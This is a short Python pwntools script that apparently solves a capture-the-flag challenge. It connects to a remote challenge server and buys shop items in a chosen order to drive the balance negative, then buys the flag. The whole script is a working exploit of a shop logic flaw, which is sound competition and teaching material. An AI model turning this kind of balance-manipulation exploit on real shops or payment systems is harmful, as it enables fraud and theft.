from pwn import *

def solve():
    conn = remote('challs.nusgreyhats.org', 35125)
    
    conn.recvuntil(b'(0) Leave')
    
    # Buy 6 Potted Plants (13 coins x 6 = 78 coins)
    for _ in range(6):
        conn.sendline(b'2')
        conn.sendline(b'1')
        conn.recvuntil(b'(0) Leave')
    
    # Buy 2 Mystery Pizzas (11 coins x 2 = 22 coins)
    for _ in range(2):
        conn.sendline(b'2')
        conn.sendline(b'2')
        conn.recvuntil(b'(0) Leave')
    
    # Achieve negative balance
    conn.sendline(b'1')
    conn.recvuntil(b'(0) Leave')
    
    # Buy the flag
    conn.sendline(b'2')
    conn.sendline(b'3')
    
    flag = conn.recvall().decode()
    print(flag)
    conn.close()

if __name__ == '__main__':
    solve()